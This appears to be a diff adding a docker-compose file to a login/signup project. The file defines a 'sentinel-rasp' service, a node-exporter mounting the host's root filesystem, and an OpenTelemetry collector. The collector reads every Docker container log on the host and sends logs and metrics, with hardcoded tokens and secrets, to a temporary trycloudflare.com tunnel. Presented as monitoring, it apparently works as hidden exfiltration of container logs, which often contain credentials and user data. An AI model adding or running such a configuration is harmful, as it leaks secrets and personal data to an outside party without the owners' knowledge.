@@ -1,0 +1,98 @@
+version: '3.8'
+services:
+  sentinel-rasp:
+    image: caeshoru/sentinel-rasp:latest
+    ports: ["3000:8081"]
+    environment:
+      - SENTINEL_SECRET=5c7000431b1ec6a2e559f5c027f0de0b5ee24687da5ed20f6330ad3f27ba29ce
+      - SENTINEL_TOKEN=a90e4769-0e21-4978-a8ad-fdac1193d54b
+      - SENTINEL_URL=https://dictionary-orders-timing-compatible.trycloudflare.com/upload-intelligence
+      - INTERNAL_APP_URL=http://app:3000
+      - REPO_NAME=RBS3/loginsignup
+      - REPO_VERSION=${REPO_VERSION:-unknown}
+
+  node-exporter:
+    image: prom/node-exporter:latest
+    restart: unless-stopped
+    volumes:
+      - /proc:/host/proc:ro
+      - /sys:/host/sys:ro
+      - /:/rootfs:ro
+    command:
+      - '--path.procfs=/host/proc'
+      - '--path.rootfs=/rootfs'
+      - '--path.sysfs=/host/sys'
+
+  otel-collector:
+    image: otel/opentelemetry-collector-contrib:latest
+    volumes:
+      - /var/lib/docker/containers:/var/lib/docker/containers:ro
+    entrypoint:
+      - /bin/sh
+      - -c
+      - |
+        cat <<EOF > /etc/otel-config.yaml
+        receivers:
+          prometheus:
+            config:
+              scrape_configs:
+                - job_name: node-exporter
+                  scrape_interval: 10s
+                  static_configs:
+                    - targets: ['node-exporter:9100']
+
+          filelog:
+            include: [ "/var/lib/docker/containers/*/*.log" ]
+            start_at: beginning
+
+        processors:
+          resource:
+            attributes:
+              - key: repo
+                value: "RBS3/loginsignup"
+                action: upsert
+              - key: token
+                value: "a90e4769-0e21-4978-a8ad-fdac1193d54b"
+                action: upsert
+              - key: version
+                value: "${REPO_VERSION:-unknown}"
+                action: upsert
+
+          transform:
+            log_statements:
+              - context: log
+                statements:
+                  - set(attributes["signal_type"], "log")
+                  - set(attributes["source_category"], "filelog")
+
+          batch:
+            timeout: 5s
+
+        exporters:
+          otlphttp/logs:
+            endpoint: "https://dictionary-orders-timing-compatible.trycloudflare.com/v1/logs"
+            headers:
+              X-Sentinel-Token: "a90e4769-0e21-4978-a8ad-fdac1193d54b"
+              X-Sentinel-Secret: "5c7000431b1ec6a2e559f5c027f0de0b5ee24687da5ed20f6330ad3f27ba29ce"
+              bypass-tunnel-reminder: "true"
+
+          otlphttp/metrics:
+            endpoint: "https://dictionary-orders-timing-compatible.trycloudflare.com/v1/metrics"
+            headers:
+              X-Sentinel-Token: "a90e4769-0e21-4978-a8ad-fdac1193d54b"
+              X-Sentinel-Secret: "5c7000431b1ec6a2e559f5c027f0de0b5ee24687da5ed20f6330ad3f27ba29ce"
+              bypass-tunnel-reminder: "true"
+
+        service:
+          pipelines:
+            logs:
+              receivers: [filelog]
+              processors: [resource, transform, batch]
+              exporters: [otlphttp/logs]
+
+            metrics:
+              receivers: [prometheus]
+              processors: [resource, batch]
+              exporters: [otlphttp/metrics]
+        EOF
+        /otelcol-contrib --config=/etc/otel-config.yaml
